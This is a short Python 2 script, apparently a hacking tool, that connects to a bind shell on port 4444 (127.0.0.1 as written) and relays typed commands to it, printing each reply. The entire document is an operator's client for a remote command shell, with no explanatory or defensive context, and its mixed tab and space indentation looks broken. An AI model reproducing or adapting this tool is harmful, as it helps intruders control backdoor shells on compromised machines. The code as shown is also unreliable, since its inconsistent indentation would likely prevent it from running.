#!/usr/bin/python

import socket

host = "127.0.0.1"
port = 4444

# try and connect to a bind shell
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	
	try :  
		print "[+] Connected to bind shell!\n"
     		while 1:  
      			cmd = raw_input("(py-shell) $ ");  
      			s.send(cmd + "\n");  
      			result = s.recv(1024).strip();  
      			if not len(result) :  
	         		print "[+] Empty response. Dead shell / exited?"
            			s.close();  
         			break;  
        		print(result);  

	except KeyboardInterrupt:
		print "\n[+] ^C Received, closing connection"
     		s.close();
	except EOFError:
		print "\n[+] ^D Received, closing connection"
     		s.close();

except socket.error:
	print "[+] Unable to connect to bind shell."